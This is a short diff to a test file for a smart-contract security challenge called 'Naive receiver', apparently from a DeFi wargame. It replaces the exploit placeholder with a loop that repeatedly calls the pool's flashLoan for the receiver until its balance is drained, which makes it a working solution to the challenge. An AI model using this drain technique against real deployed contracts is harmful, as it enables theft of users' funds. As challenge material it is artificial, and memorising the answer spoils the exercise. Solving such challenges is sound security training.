@@ -31,7 +31,9 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+        while(await balance.current(this.receiver.address) > 0) {
+            await this.pool.flashLoan(this.receiver.address, 0);
+        }
     });
 
     after(async function () {
